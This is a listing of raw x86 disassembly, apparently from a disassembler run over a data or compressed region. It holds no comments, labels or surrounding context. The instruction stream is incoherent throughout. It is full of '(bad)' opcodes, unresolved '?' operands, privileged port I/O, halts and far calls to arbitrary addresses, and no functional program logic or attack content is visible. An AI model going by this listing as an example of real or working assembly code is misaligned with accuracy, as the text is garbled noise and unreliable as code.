  48c2f3:	adc    al,0x9c
  48c2f5:	repnz nop
  48c2f7:	dec    ecx
  48c2f8:	lods   al,BYTE PTR es:[esi]
  48c2fa:	mov    esp,0x75bfecbe
  48c2ff:	int3   
  48c300:	cmp    al,bl
  48c302:	sub    al,0x4d
  48c304:	pop    edi
  48c305:	out    dx,al
  48c306:	cmp    al,0x97
  48c308:	leave  
  48c309:	mov    eax,0x68013bba
  48c30e:	clc    
  48c30f:	dec    edi
  48c310:	call   0x4056e61b
  48c315:	cmp    al,0x8b
  48c317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c318:	(bad)  
  48c319:	mov    edi,0x468a65ab
  48c31e:	les    ebp,FWORD PTR [eax]
  48c320:	jp     0x48c34a
  48c322:	mov    edx,DWORD PTR [eax]
  48c324:	mov    eax,ds:0xd3c448d6
  48c329:	mov    ah,0x85
  48c32b:	mov    cl,0xe
  48c32d:	inc    DWORD PTR [ecx]
  48c32f:	mov    al,0x8e
  48c331:	cmp    eax,0x827ea5e9
  48c336:	mov    esi,DWORD PTR [ebx+0x64]
  48c339:	push   edi
  48c33a:	mov    al,0xa9
  48c33c:	mov    ds,WORD PTR [edi]
  48c33e:	or     al,0x10
  48c340:	stos   BYTE PTR es:[edi],al
  48c341:	rcr    BYTE PTR [edi+ebx*4+0x70],0x5
  48c346:	adc    al,0x30
  48c348:	sbb    ebp,DWORD PTR [ebx]
  48c34a:	push   es
  48c34b:	popf   
  48c34c:	sahf   
  48c34d:	arpl   WORD PTR [ecx-0x20],dx
  48c350:	adc    al,0x48
  48c352:	pop    edi
  48c353:	fstp   QWORD PTR [esi]
  48c355:	arpl   WORD PTR [ebx],si
  48c357:	je     0x48c353
  48c359:	lods   eax,DWORD PTR ds:[esi]
  48c35a:	mov    edi,0x34e3453
  48c35f:	dec    eax
  48c360:	lock lods eax,DWORD PTR ds:[esi]
  48c362:	xchg   ebp,eax
  48c363:	stos   BYTE PTR es:[edi],al
  48c364:	adc    DWORD PTR [ecx],eax
  48c366:	shr    BYTE PTR [ebp-0x5c557bbf],cl
  48c36c:	sub    al,0x41
  48c36e:	mov    bh,0xfe
  48c370:	(bad)  
  48c371:	push   ss
  48c372:	popf   
  48c373:	dec    edx
  48c374:	push   ebx
  48c375:	xchg   ebx,eax
  48c376:	sti    
  48c377:	sub    DWORD PTR ds:0xcf3e582,eax
  48c37d:	mov    eax,ds:0xe540c6c4
  48c382:	sbb    edi,0xa0dcc137
  48c388:	sbb    BYTE PTR [edx-0x59a94afe],bl
  48c38e:	adc    DWORD PTR [edx],edx
  48c390:	popa   
  48c391:	test   eax,0xe19ffb06
  48c396:	push   eax
  48c397:	dec    eax
  48c398:	adc    al,0xfa
  48c39a:	inc    ebx
  48c39b:	out    dx,eax
  48c39c:	lea    edx,[ebx-0xe7d0add]
  48c3a2:	push   edx
  48c3a3:	push   edi
  48c3a4:	mov    edi,0x86f1f0f3
  48c3a9:	sbb    DWORD PTR [edx],eax
  48c3ab:	push   es
  48c3ac:	push   eax
  48c3ad:	fldcw  WORD PTR [esp+edi*2+0x70]
  48c3b1:	cld    
  48c3b2:	sub    BYTE PTR [edx+0x1e895657],dl
  48c3b8:	pop    ebx
  48c3b9:	lea    edi,[esi+0x34]
  48c3bc:	mov    cl,0x8a
  48c3be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48c3bf:	pop    ebp
  48c3c0:	(bad)  
  48c3c1:	push   cs
  48c3c2:	js     0x48c38f
  48c3c4:	in     eax,dx
  48c3c5:	jbe    0x48c38b
  48c3c7:	pop    ebp
  48c3c8:	mov    ah,0xc7
  48c3ca:	xchg   ah,ch
  48c3cc:	sbb    BYTE PTR [ebp+0xa12f09e],ah
  48c3d2:	hlt    
  48c3d3:	jae    0x48c3f6
  48c3d5:	(bad)  
  48c3d6:	cs clc 
  48c3d8:	jmp    0x48c408
  48c3da:	test   BYTE PTR [edi],bh
  48c3dc:	xchg   ebp,eax
  48c3dd:	pop    es
  48c3de:	sub    eax,DWORD PTR [edx-0x25a0e79e]
  48c3e4:	(bad)  
  48c3e5:	fdivrp st(7),st
  48c3e7:	mov    ebx,0xa575864a
  48c3ec:	ins    BYTE PTR es:[edi],dx
  48c3ed:	out    dx,al
  48c3ee:	mov    BYTE PTR fs:[edi+0x10],bl
  48c3f2:	sbb    ebx,edx
  48c3f4:	xor    al,0x6d
  48c3f6:	rcr    DWORD PTR [edx],0x5f
  48c3f9:	and    al,0x4
  48c3fb:	sub    al,0x30
  48c3fd:	xor    al,0x8c
  48c3ff:	xor    cl,ah
  48c401:	jle    0x48c43b
  48c403:	mov    DWORD PTR [edi+0x3c],0xc9a2800
  48c40a:	push   eax
  48c40b:	and    ah,BYTE PTR [eax+0x5]
  48c40e:	lahf   
  48c40f:	xchg   edx,eax
  48c410:	(bad)  
  48c411:	pop    ebx
  48c412:	mov    edi,0xd84047d5
  48c417:	inc    ebp
  48c418:	push   esi
  48c419:	adc    cl,ah
  48c41b:	aam    0xc6
  48c41d:	inc    ecx
  48c41e:	add    DWORD PTR [ecx-0x37],edi
  48c421:	add    BYTE PTR [eax],al
  48c423:	gs xchg ecx,eax
  48c425:	je     0x48c447
  48c427:	and    ebp,DWORD PTR [edi+ebx*8+0x28f1dab1]
  48c42e:	mov    BYTE PTR [edi-0x38],dh
  48c431:	clc    
  48c432:	in     eax,0x8e
  48c434:	ror    edx,1
  48c436:	or     esp,DWORD PTR [ebx]
  48c438:	jmp    0x86d29bac
  48c43d:	loop   0x48c477
  48c43f:	dec    ebp
  48c440:	mov    bh,ch
  48c442:	ror    BYTE PTR [ecx],cl
  48c444:	cmp    ebp,DWORD PTR [edx+0x64]
  48c447:	lock fnstenv es:[eax]
  48c44b:	shr    BYTE PTR [ecx],0xf0
  48c44e:	clc    
  48c44f:	sub    eax,0xc3ca1478
  48c454:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c455:	dec    ecx
  48c456:	pop    edi
  48c457:	mov    ebx,DWORD PTR [eax]
  48c459:	sbb    DWORD PTR [eax-0x6817ecc],ebx
  48c45f:	pop    ss
  48c460:	adc    dx,WORD PTR [edi+0x2fb11ccb]
  48c467:	push   esp
  48c468:	xor    cl,BYTE PTR [ebx]
  48c46a:	xchg   dh,bh
  48c46c:	(bad)  
  48c46d:	push   ds
  48c46e:	sbb    bl,BYTE PTR [edi+0x1c3f300f]
  48c474:	dec    ebp
  48c475:	call   0xe04bce0d
  48c47a:	mov    ebp,DWORD PTR [ebx]
  48c47c:	mov    edi,0xb03f1d4a
  48c481:	mov    edi,DWORD PTR ds:0x32ce3b80
  48c487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48c488:	js     0x48c46a
  48c48a:	sbb    bh,BYTE PTR [ebx+esi*2]
  48c48d:	push   ecx
  48c48e:	call   0xc0ae:0x8443b814
  48c495:	pop    esp
  48c496:	(bad)  
  48c497:	sub    ebx,eax
  48c499:	and    BYTE PTR [edi],bh
  48c49b:	add    BYTE PTR [esi+0x24],al
  48c49e:	shl    DWORD PTR [ecx],cl
  48c4a0:	dec    ebp
  48c4a1:	cld    
  48c4a2:	jne    0x48c4ee
  48c4a4:	and    bl,ah
  48c4a6:	mov    cs,ecx
  48c4a8:	mov    ds:0x7c47520,al
  48c4ad:	mov    edx,0x3c41a85f
  48c4b2:	push   ebp
  48c4b3:	cmp    cl,BYTE PTR [edx]
  48c4b5:	push   ecx
  48c4b6:	lea    esi,[ebp-0x35]
  48c4b9:	ror    BYTE PTR [edi+0x4204d4f],1
  48c4bf:	call   0x1a3d4ff0
  48c4c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48c4c5:	popf   
  48c4c6:	pop    esi
  48c4c7:	jecxz  0x48c481
  48c4c9:	lods   al,BYTE PTR ds:[esi]
  48c4ca:	stc    
  48c4cb:	jecxz  0x48c4f9
  48c4cd:	push   edx
  48c4ce:	xor    DWORD PTR [eax],esp
  48c4d0:	dec    esi
  48c4d1:	jmp    0x48c511
  48c4d3:	xchg   esi,eax
  48c4d4:	inc    edx
  48c4d5:	or     BYTE PTR [ecx+0x381a2047],bl
  48c4db:	xor    eax,0x8d1ed751
  48c4e0:	repnz push ebx
  48c4e2:	mov    fs,WORD PTR [esi-0x2fa2d08c]
  48c4e8:	add    ecx,eax
  48c4ea:	pop    esp
  48c4eb:	popa   
  48c4ec:	adc    DWORD PTR [esi],edi
  48c4ee:	lods   al,BYTE PTR ds:[esi]
  48c4ef:	and    DWORD PTR [edi],0xffffffb7
  48c4f2:	jmp    0xbe9b898b
  48c4f7:	cmc    
  48c4f8:	cld    
  48c4f9:	lahf   
  48c4fa:	pop    es
  48c4fb:	ret    0xc320
  48c4fe:	repnz popa 
  48c500:	pop    edi
  48c501:	inc    ebp
  48c502:	or     DWORD PTR [esi],edx
  48c504:	dec    esp
  48c505:	jnp    0x48c54d
  48c507:	jbe    0x48c532
  48c509:	in     al,0xa2
  48c50b:	jmp    0x441d1636
  48c510:	mov    al,0xb8
  48c512:	adc    edx,DWORD PTR [ecx+edx*2+0x43]
  48c516:	sub    al,0x6d
  48c518:	sbb    al,0xdf
  48c51a:	jno    0x48c503
  48c51c:	enter  0x4eb6,0x72
  48c520:	fnstsw WORD PTR [edx-0x60]
  48c523:	add    BYTE PTR [esi+0x30bc49af],al
  48c529:	adc    ebx,esi
  48c52b:	cs je  0x48c506
  48c52e:	adc    BYTE PTR [ecx],cl
  48c530:	test   DWORD PTR [esi],0xb1f4c1ca
  48c536:	shr    BYTE PTR [edi],cl
  48c538:	sbb    ebp,edx
  48c53a:	jmp    0x48c4fe
  48c53c:	pop    edi
  48c53d:	cmp    al,0x4
  48c53f:	clc    
  48c540:	lea    eax,[ebp+0x114690d8]
  48c546:	push   ebp
  48c547:	push   esp
  48c548:	push   eax
  48c549:	mov    cl,0xd0
  48c54b:	les    ebp,FWORD PTR [ecx-0x41]
  48c54e:	push   esi
  48c54f:	nop    DWORD PTR [esi]
  48c552:	sub    al,0xc0
  48c554:	adc    al,0x54
  48c556:	repz inc esp
  48c558:	test   DWORD PTR [ebx],0x26035d54
  48c55e:	jle    0x48c562
  48c560:	mov    eax,ds:0xe8be2812
  48c565:	nop
  48c566:	icebp  
  48c567:	jo     0x48c5b8
  48c569:	jae    0x48c540
  48c56b:	and    al,BYTE PTR [edi]
  48c56d:	push   0xfbff003c
  48c572:	mov    esp,0xe531822f
  48c577:	sbb    al,0x84
  48c579:	push   esi
  48c57a:	adc    al,0x8a
  48c57c:	or     eax,0x6695a150
  48c581:	mov    dh,0xa
  48c583:	sbb    eax,0x95504ae9
  48c588:	enter  0x23ee,0x82
  48c58c:	push   ecx
  48c58d:	nop
  48c58e:	push   edx
  48c58f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c590:	mov    BYTE PTR ds:0x78260a58,cl
  48c596:	xchg   edi,eax
  48c597:	and    bh,BYTE PTR [ebx-0x33]
  48c59a:	push   ss
  48c59b:	mov    ebp,edi
  48c59d:	mov    esp,0x5c04f74f
  48c5a2:	std    
  48c5a3:	in     al,0x80
  48c5a5:	sti    
  48c5a6:	rol    BYTE PTR [ecx],1
  48c5a8:	sub    dh,bl
  48c5aa:	mov    ch,0x3
  48c5ac:	ja     0x48c535
  48c5ae:	mov    WORD PTR [ecx+0x6c],?
  48c5b1:	cmp    BYTE PTR ds:0xbe0a1c6c,0x71
  48c5b8:	(bad)  
  48c5b9:	pop    ebx
  48c5ba:	sub    al,0x6c
  48c5bc:	arpl   WORD PTR [edx+ebp*2+0x41f2b901],di
  48c5c3:	jnp    0x48c5fe
  48c5c5:	div    bl
  48c5c7:	cmp    eax,0xe63978b9
  48c5cc:	mov    ebx,0x59c4413
  48c5d1:	lahf   
  48c5d2:	cmp    ah,bl
  48c5d4:	dec    esp
  48c5d5:	push   es
  48c5d6:	fdivr  st,st(5)
  48c5d8:	dec    ebp
  48c5d9:	(bad)  
  48c5da:	sbb    bl,BYTE PTR [esi-0x44a00879]
  48c5e0:	xchg   ecx,eax
  48c5e1:	push   ds
  48c5e2:	jl     0x48c585
  48c5e4:	add    al,0x96
  48c5e6:	shr    ah,0x2c
  48c5e9:	(bad)  
  48c5ea:	cmp    BYTE PTR [eax+0x1d],bl
  48c5ed:	(bad)  
  48c5ee:	push   0x274e1721
  48c5f3:	jle    0x48c5f0
  48c5f5:	lea    ecx,[ebx-0x80]
  48c5f8:	jecxz  0x48c5c3
  48c5fa:	inc    esi
  48c5fb:	or     eax,0x4a8c9d7c
  48c600:	xlat   BYTE PTR ds:[ebx]
  48c601:	adc    eax,0x5cf00b74
  48c606:	jae    0x48c628
  48c608:	cmp    eax,0x68193bcf
  48c60d:	push   ss
  48c60e:	sub    BYTE PTR [eax],dh
  48c610:	xor    al,0xa4
  48c612:	addr16 xor al,0x12
  48c615:	shl    edx,0x6c
  48c618:	or     al,0x8c
  48c61a:	xor    esp,DWORD PTR [esi+ebx*1-0x4a]
  48c61e:	push   es
  48c61f:	sbb    BYTE PTR [ebx],dl
  48c621:	dec    esi
  48c622:	mov    eax,ds:0x9414bb89
  48c627:	xchg   esp,eax
  48c628:	pop    esi
  48c629:	icebp  
  48c62a:	fnstsw WORD PTR [ebx+0xcacdb66]
  48c630:	adc    esp,edi
  48c632:	call   eax
  48c634:	mov    ds:0x70c36829,eax
  48c639:	inc    ebx
  48c63a:	add    al,ah
  48c63c:	out    dx,al
  48c63d:	ins    BYTE PTR es:[edi],dx
  48c63e:	xchg   esi,eax
  48c63f:	jbe    0x48c64a
  48c641:	dec    ebp
  48c642:	adc    DWORD PTR [ecx+eiz*4+0x7c2dc08],ebp
  48c649:	fdiv   QWORD PTR [edx+ebx*1]
  48c64c:	test   ah,ah
  48c64e:	fcomp  QWORD PTR [esi+ebx*1]
  48c651:	or     dh,bh
  48c653:	and    eax,0xd8b8c9c
  48c658:	sub    al,0x96
  48c65a:	push   0x2
  48c65c:	test   DWORD PTR [ecx-0x75],esi
  48c65f:	mov    eax,DWORD PTR [esi]
  48c661:	push   0xb09d2001
  48c666:	and    eax,0x291be148
  48c66b:	add    edx,DWORD PTR [ebx+0x7bc494c]
  48c671:	push   eax
  48c672:	jl     0x48c5fd
  48c674:	cmp    BYTE PTR ds:0x22af1ce8,al
  48c67a:	pop    esp
  48c67b:	retf   
  48c67c:	sbb    ebp,DWORD PTR [edx]
  48c67e:	adc    BYTE PTR [eax],bl
  48c680:	add    BYTE PTR [edx+0x48],0x1b
  48c684:	or     al,0xcb
  48c686:	add    DWORD PTR [eax],esi
  48c688:	les    eax,FWORD PTR [ebx]
  48c68a:	cdq    
  48c68b:	pop    ecx
  48c68c:	aaa    
  48c68d:	xchg   edx,eax
  48c68e:	nop
  48c68f:	pop    edx
  48c690:	adc    DWORD PTR [ebp+0x575c874a],edx
  48c696:	dec    edi
  48c697:	dec    edi
  48c698:	adc    eax,0x6f3e3542
  48c69d:	mov    ebp,DWORD PTR [eax+0x4e]
  48c6a0:	jo     0x48c633
  48c6a2:	jb     0x48c6f4
  48c6a4:	and    DWORD PTR [ebx+eax*8],esi
  48c6a7:	imul   edx,DWORD PTR [ebx+0x1e],0xffffffc9
  48c6ab:	and    BYTE PTR [edi],al
  48c6ad:	fcom   DWORD PTR [ebx+0x5e]
  48c6b0:	add    al,0xae
  48c6b2:	push   0xffffffbc
  48c6b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48c6b5:	test   bh,al
  48c6b7:	les    ebx,FWORD PTR [edi]
  48c6b9:	pop    eax
  48c6ba:	ret    
  48c6bb:	hlt    
  48c6bc:	gs mov edi,0x4380ac3f
  48c6c2:	mov    ds:0x2ce95114,al
  48c6c7:	mov    edi,0x8084f0e4
  48c6cc:	or     DWORD PTR [eax+0x7cb23846],edi
  48c6d2:	sub    eax,0xb2304eb5
  48c6d7:	sub    bl,al
  48c6d9:	mov    es,WORD PTR [ecx+0x534fdc77]
  48c6df:	retf   0xee71
  48c6e2:	adc    ecx,DWORD PTR [ebx-0x5a97777b]
  48c6e8:	fcom   QWORD PTR [edi-0x3dc82fb8]
  48c6ee:	imul   eax,DWORD PTR ds:0x8eec7db4,0x14
  48c6f5:	mov    ?,WORD PTR [ebx]
  48c6f7:	ficomp DWORD PTR [ecx-0x20]
  48c6fa:	imul   esi,DWORD PTR [ebx+0x26a241de],0x8aeaae34
  48c704:	jle    0x48c784
  48c706:	or     BYTE PTR [ebx],dh
  48c708:	sub    al,0xe6
  48c70a:	pop    ds
  48c70b:	push   es
  48c70c:	loopne 0x48c6da
  48c70e:	cmp    edx,eax
  48c710:	mov    dl,0x63
  48c712:	adc    BYTE PTR [ebx],bl
  48c714:	stos   BYTE PTR es:[edi],al
  48c715:	mov    ecx,edx
  48c717:	xor    edx,esp
  48c719:	cli    
  48c71a:	inc    ecx
  48c71b:	sbb    al,0xa1
  48c71d:	pusha  
  48c71e:	(bad)  
  48c71f:	repnz xor al,0xb9
  48c722:	xor    eax,0x10e8b9f5
  48c727:	int3   
  48c728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c729:	retf   
  48c72a:	jne    0x48c732
  48c72c:	xor    al,BYTE PTR [edx]
  48c72e:	jle    0x48c70a
  48c730:	ja     0x48c716
  48c732:	jb     0x48c71c
  48c734:	inc    eax
  48c735:	cmp    edi,eax
  48c737:	jbe    0x48c6cc
  48c739:	lea    edi,[ebp-0x34]
  48c73c:	pop    ebx
  48c73d:	in     eax,dx
  48c73e:	cmp    BYTE PTR [edi-0x2d],0xc7
  48c742:	mov    esp,0x8da03ff
  48c747:	ja     0x48c6e6
  48c749:	jno    0x48c795
  48c74b:	test   al,0x6
  48c74d:	xchg   BYTE PTR [ecx-0x5c5df0],dl
  48c753:	xor    dl,BYTE PTR [esi-0x23]
  48c756:	imul   ebx,DWORD PTR [eax+0x59],0x84afa2e
  48c75d:	push   esp
  48c75e:	adc    BYTE PTR [ecx],0x8d
  48c761:	cmp    al,0x66
  48c763:	inc    dl
  48c765:	fs jl  0x48c7df
  48c768:	cmovbe edi,DWORD PTR [edx+0x751d0848]
  48c76f:	adc    DWORD PTR [ebx-0x729679b4],ecx
  48c775:	and    al,0x1a
  48c777:	jb     0x48c77c
  48c779:	enter  0x7208,0x2f
  48c77d:	and    BYTE PTR [ebx],0x7e
  48c780:	fistp  WORD PTR [eax-0x7ae279f4]
  48c786:	xor    al,0xb4
  48c788:	pushf  
  48c789:	xor    bl,BYTE PTR [esi-0x58]
  48c78c:	jns    0x48c754
  48c78e:	push   ebp
  48c78f:	sbb    esi,DWORD PTR [edx]
  48c791:	or     al,0x98
  48c793:	push   cs
  48c794:	pop    ebp
  48c795:	call   0xa242971e
  48c79a:	pusha  
  48c79b:	adc    BYTE PTR [esi+0xa],al
  48c79e:	aam    0x42
  48c7a0:	xchg   ebp,eax
  48c7a1:	in     al,0x32
  48c7a3:	or     DWORD PTR [eax+ebp*1],0xb80d8352
  48c7aa:	add    bh,cl
  48c7ac:	or     BYTE PTR [ebx],al
  48c7ae:	dec    eax
  48c7af:	or     ecx,DWORD PTR [esi+ebp*2]
  48c7b2:	cmp    BYTE PTR [ecx],al
  48c7b4:	pop    esi
  48c7b5:	shr    BYTE PTR [edx],0x9a
  48c7b8:	mov    dl,0x7
  48c7ba:	xor    al,0x1a
  48c7bc:	jne    0x48c7c1
  48c7be:	or     BYTE PTR [ebx-0x15f4ae3],ah
  48c7c4:	hlt    
  48c7c5:	sub    BYTE PTR [ebx+edi*4+0x5fc44d49],0x36
  48c7cd:	icebp  
  48c7ce:	mov    esp,0xec04c43
  48c7d3:	adc    bl,ah
  48c7d5:	and    ch,bl
  48c7d7:	mov    ch,BYTE PTR [esi+esi*1-0x5]
  48c7db:	pushf  
  48c7dc:	and    eax,0xc3d417c6
  48c7e1:	pop    eax
  48c7e2:	mov    esi,0x396b8f44
  48c7e7:	cmp    al,0x86
  48c7e9:	mov    es,WORD PTR [ebx+0x75e2573f]
  48c7ef:	push   cs
  48c7f0:	call   0xc04:0xbe4d89a6
  48c7f7:	adc    BYTE PTR [esi+esi*8],dl
  48c7fa:	cmp    DWORD PTR [edx+0x25],edi
  48c7fd:	cli    
  48c7fe:	clc    
  48c7ff:	push   DWORD PTR [ebp+ebp*8+0x5c]
  48c803:	or     al,0x89
  48c805:	ds aaa 
  48c807:	mov    edi,0xff242845
  48c80c:	ror    dh,cl
  48c80e:	or     al,0x8d
  48c810:	ret    0xc458
  48c813:	lds    ecx,FWORD PTR [esi+0x18]
  48c816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48c817:	std    
  48c818:	cs test dh,dh
  48c81b:	or     eax,0x30042c04
  48c820:	test   edx,esi
  48c822:	in     al,0x5
  48c824:	mov    cl,0xff
  48c826:	pop    edx
  48c827:	nop
  48c828:	ins    BYTE PTR es:[edi],dx
  48c829:	nop
  48c82a:	mov    ch,dh
  48c82c:	in     al,0x72
  48c82e:	cmp    BYTE PTR [eax],bl
  48c830:	mov    esi,ebx
  48c832:	std    
  48c833:	jle    0x48c85b
  48c835:	sbb    al,BYTE PTR [ebx-0x72733f21]
  48c83b:	ja     0x48c871
  48c83d:	mov    ebp,0xfce3983
  48c842:	dec    edi
  48c843:	push   0xff15c7d5
  48c848:	jbe    0x48c81a
  48c84a:	pop    eax
  48c84b:	push   esi
  48c84c:	pop    eax
  48c84d:	js     0x48c7d0
  48c84f:	sub    al,0xc7
  48c851:	sub    dl,0xdd
  48c854:	push   es
  48c855:	in     al,dx
  48c856:	pop    ss
  48c857:	jl     0x48c806
  48c859:	repnz mov edi,0xa3fe1288
  48c85f:	mov    edx,0x283ee9c1
  48c864:	mov    ds:0xa3840980,eax
  48c869:	in     al,dx
  48c86a:	mov    ebx,0x9e976d48
  48c86f:	cmp    eax,0x1df0b876
  48c874:	adc    DWORD PTR [edi+ebx*2-0x35],ebx
  48c878:	(bad)  
  48c879:	jmp    0xe193eb3f
  48c87e:	adc    al,BYTE PTR [ecx]
  48c880:	or     DWORD PTR [edx],esp
  48c882:	sub    BYTE PTR [edi+ebp*4],cl
  48c885:	mov    bh,dh
  48c887:	or     eax,0xb0c30311
  48c88c:	sbb    eax,0x185028c6
  48c891:	or     dl,BYTE PTR [eax+0x3aa867b6]
  48c897:	and    BYTE PTR [edi+0x3f],ah
  48c89a:	adc    DWORD PTR [edx],ebp
  48c89c:	inc    ecx
  48c89d:	jne    0x48c857
  48c89f:	mov    ds:0x1be8e340,al
  48c8a4:	sub    dl,BYTE PTR [edx+0x3a25c54]
  48c8aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c8ab:	cli    
  48c8ac:	aam    0x30
  48c8ae:	xchg   esp,eax
  48c8af:	retf   0xf63f
  48c8b2:	nop
  48c8b3:	sub    ch,dh
  48c8b5:	mov    ds:0xddea5685,al
  48c8ba:	add    eax,0xd5010b0
  48c8bf:	fdiv   DWORD PTR [edx+0x561ffdcf]
  48c8c5:	mov    esi,0xdce2601b
  48c8ca:	xor    edi,ebx
  48c8cc:	bound  esi,QWORD PTR [ecx]
  48c8ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48c8cf:	push   edx
  48c8d0:	fild   QWORD PTR [ecx]
  48c8d2:	jmp    0x683c16eb
  48c8d7:	sti    
  48c8d8:	dec    esi
  48c8d9:	add    BYTE PTR [ecx],0x8
  48c8dc:	mov    WORD PTR [edx-0x772a5d7d],cs
  48c8e2:	inc    DWORD PTR [eax+eiz*8]
  48c8e5:	and    DWORD PTR [ebx],ecx
  48c8e7:	stos   DWORD PTR es:[edi],eax
  48c8e8:	add    BYTE PTR [eax-0x71],bl
  48c8eb:	sar    BYTE PTR [edi+0x29],0x83
  48c8ef:	into   
  48c8f0:	(bad)  
  48c8f1:	mov    ecx,0x30428670
  48c8f6:	iret   
  48c8f7:	in     eax,0x57
  48c8f9:	mov    ecx,0x34a3015a
  48c8fe:	cmp    BYTE PTR [esi],dl
  48c900:	mov    BYTE PTR ds:0xdda3403c,bl
  48c906:	push   edi
  48c907:	imul   ebp,DWORD PTR [eax+ecx*2+0xb504c95],0xe7351754
  48c912:	bnd jge 0x48c8ac
  48c915:	pop    eax
  48c916:	pop    esp
  48c917:	or     esp,DWORD PTR [eax+0x75]
  48c91a:	fs push 0x17000eac
  48c920:	cmc    
  48c921:	jb     0x48c8a9
  48c923:	into   
  48c924:	in     eax,0xf2
  48c926:	ffree  st(5)
  48c928:	nop
  48c929:	jge    0x48c8bf
  48c92b:	cwde   
  48c92c:	pushf  
  48c92d:	xchg   edi,eax
  48c92e:	dec    ebx
  48c92f:	in     eax,0xd3
  48c931:	inc    edx
  48c932:	mov    al,ds:0xa8a4cc2c
  48c937:	lods   al,BYTE PTR ds:[esi]
  48c938:	dec    ebx
  48c939:	jnp    0x48c91c
  48c93b:	jl     0x48c974
  48c93d:	mov    al,0xa0
  48c93f:	clc    
  48c940:	mov    ah,0xef
  48c942:	mov    ebx,0x87b8be5c
  48c947:	mov    esp,0xc80bc4c0
  48c94c:	and    esi,DWORD PTR [edi+edx*2+0x2a]
  48c950:	mov    edi,0x87000bfc
  48c955:	add    al,0x35
  48c957:	or     BYTE PTR [edi-0x3276bb75],al
  48c95d:	psllw  mm7,QWORD PTR [ebp+ebp*1-0x1e]
  48c962:	or     al,0x84
  48c964:	stc    
  48c965:	mov    WORD PTR [eax-0x3223fe9],es
  48c96b:	pop    ebp
  48c96c:	cld    
  48c96d:	mov    ebx,0x52fc92b5
  48c972:	mov    esi,0xf53838a0
  48c977:	sub    DWORD PTR [ebx],edx
  48c979:	cld    
  48c97a:	dec    ebx
  48c97b:	jne    0x48c96c
  48c97d:	pop    edx
  48c97e:	sbb    BYTE PTR [edx],dh
  48c980:	mov    esi,0x1cc3eac6
  48c985:	mov    ?,WORD PTR [eax-0x1]
  48c988:	mov    esp,ds
  48c98a:	mov    ebx,0x11862f8f
  48c98f:	push   edi
  48c990:	mov    DWORD PTR [edx+esi*1+0x77bb870f],0xe138334d
  48c99b:	mov    BYTE PTR [ebp+0x7cc6816c],cl
  48c9a1:	sub    al,0x25
  48c9a3:	adc    ch,BYTE PTR [ecx-0x3b]
  48c9a6:	test   al,cl
  48c9a8:	ret    
  48c9a9:	jg     0x48c936
  48c9ab:	fsub   DWORD PTR [eax]
  48c9ad:	add    ebp,DWORD PTR [edi-0x79]
  48c9b0:	dec    eax
  48c9b1:	push   ebp
  48c9b2:	push   edi
  48c9b3:	aaa    
  48c9b4:	xchg   DWORD PTR [ecx+esi*2],eax
  48c9b7:	popa   
  48c9b8:	mov    al,ds:0x5eb114fa
  48c9bd:	and    eax,0xf18dc7b1
  48c9c2:	dec    DWORD PTR [ecx-0x3c09d7a2]
  48c9c8:	add    esi,DWORD PTR [ebp+0x9]
  48c9cb:	or     ebx,0x37121afe
  48c9d1:	jo     0x48ca32
  48c9d3:	inc    eax
  48c9d4:	sub    BYTE PTR [esi-0x7b44242a],bh
  48c9da:	jle    0x48c962
  48c9dc:	fsubp  st(0),st
  48c9de:	push   ebp
  48c9df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48c9e0:	add    DWORD PTR [esi+0x639c37fe],ecx
  48c9e6:	and    BYTE PTR [ebx+0x12],ch
  48c9e9:	fst    st(0)
  48c9eb:	jl     0x48ca24
  48c9ed:	pop    esp
  48c9ee:	mov    cl,0xa7
  48c9f0:	sbb    al,0x2f
  48c9f2:	fimul  DWORD PTR [ecx]
  48c9f4:	aas    
  48c9f5:	inc    edi
  48c9f6:	sub    ah,al
  48c9f8:	push   0x2a6ee6cd
  48c9fd:	mov    al,0xb4
  48c9ff:	dec    edi
  48ca00:	xor    BYTE PTR [ecx-0x7ac2815d],ch
  48ca06:	test   al,0x8d
  48ca08:	call   0x54a9:0xc18e1126
  48ca0f:	imul   ebp,DWORD PTR [edx],0x8524b2ad
  48ca15:	aaa    
  48ca16:	and    BYTE PTR [esi],cl
  48ca18:	cmp    eax,DWORD PTR [eax+0x3f]
  48ca1b:	push   esi
  48ca1c:	sub    DWORD PTR [ecx+ebx*8],edx
  48ca1f:	jbe    0x48ca9b
  48ca21:	push   edi
  48ca22:	sbb    al,0x51
  48ca24:	add    al,bl
  48ca26:	add    BYTE PTR [edi],bl
  48ca28:	pop    edx
  48ca29:	(bad)  
  48ca2a:	in     al,dx
  48ca2b:	mov    DWORD PTR [ebp+0x1d],edx
  48ca2e:	iret   
  48ca2f:	mov    esi,fs
  48ca31:	loopne 0x48ca54
  48ca33:	cmp    bh,al
  48ca35:	mov    ebx,0xef4758d
  48ca3a:	loopne 0x48ca2c
  48ca3c:	retf   0x835
  48ca3f:	push   es
  48ca40:	mov    ebx,0xfd292731
  48ca45:	fst    QWORD PTR [ebx+eiz*1-0x5c]
  48ca49:	hlt    
  48ca4a:	dec    eax
  48ca4b:	jb     0x48ca61
  48ca4d:	mov    cl,BYTE PTR [edx]
  48ca4f:	cmp    cl,0xff
  48ca52:	and    al,0xcc
  48ca54:	xor    al,0xb3
  48ca56:	in     al,0xfb
  48ca58:	test   BYTE PTR [eax],dl
  48ca5a:	(bad)  
  48ca5b:	mov    ah,0x7f
  48ca5d:	jne    0x48ca39
  48ca5f:	mov    bh,0x75
  48ca61:	jb     0x48ca6c
  48ca63:	cmp    BYTE PTR [edx],0xef
  48ca66:	sbb    bl,BYTE PTR [esi]
  48ca68:	or     BYTE PTR [eax],ah
  48ca6a:	cmp    DWORD PTR [edi+0x2c],0x0
  48ca6e:	mov    ebx,DWORD PTR [ebp+0x1a75ee6b]
  48ca74:	cmp    eax,0xf730287f
  48ca79:	aad    0xe0
  48ca7b:	mov    esp,0xb62e3497
  48ca80:	pop    esp
